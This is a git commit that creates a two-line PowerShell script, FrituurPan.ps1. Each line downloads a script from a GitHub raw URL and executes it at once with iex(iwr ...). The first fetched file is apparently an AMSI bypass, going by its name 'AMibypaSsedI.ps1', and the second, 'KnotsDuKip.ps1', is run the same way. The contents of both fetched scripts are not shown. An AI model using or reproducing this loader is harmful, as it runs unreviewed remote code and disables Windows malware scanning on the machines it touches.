93c8941df0a60bc8ed3aeaba494ad401b25c4a5d
Justin Perdok <justin-p@users.noreply.github.com>
2020-08-26 12:56:54 +0000

    Create FrituurPan.ps1

---
+++ FrituurPan.ps1
@@ -0,0 +1,2 @@
+iex((iwr https://raw.githubusercontent.com/justin-p/PowerShell/master/AMibypaSsedI.ps1).content)
+iex((iwr https://raw.githubusercontent.com/justin-p/PowerShell/master/KnotsDuKip.ps1).content)
